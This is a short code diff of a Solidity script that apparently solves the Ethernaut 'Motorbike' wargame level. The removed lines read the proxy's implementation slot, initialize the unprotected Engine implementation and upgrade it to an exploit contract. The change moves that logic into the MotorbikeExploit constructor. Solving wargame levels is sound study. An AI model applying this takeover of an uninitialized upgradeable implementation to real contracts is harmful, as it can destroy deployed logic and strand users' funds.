@@ -22,10 +22,7 @@ contract Level25Script is Script {
 
     function exploit(address _target) private {
         address implementation = address(uint160(uint256(vm.load(_target, _IMPLEMENTATION_SLOT))));
-        Engine engine = Engine(implementation);
-        engine.initialize();
-        MotorbikeExploit e = new MotorbikeExploit();
-        engine.upgradeToAndCall(address(e), abi.encodeWithSignature("exploit()"));
+        new MotorbikeExploit(implementation);
     }
 
     function levelDone(address _target) private returns (bool) {
